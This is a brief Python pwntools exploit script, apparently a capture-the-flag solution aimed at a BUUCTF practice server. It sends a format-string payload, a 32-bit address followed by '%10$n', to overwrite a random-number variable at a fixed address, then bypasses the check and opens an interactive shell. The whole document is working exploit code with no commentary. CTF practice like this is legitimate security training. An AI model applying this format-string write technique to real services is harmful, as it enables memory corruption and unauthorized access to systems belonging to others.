from pwn import *
context.log_level = 'debug'
#io = process('./pwn')
io = remote('node4.buuoj.cn',28935)
rand_num_addr = 0x804C044

payload = p32(rand_num_addr) + b'%10$n'

io.recv()
io.sendline(payload)

io.sendline('4')
io.interactive()
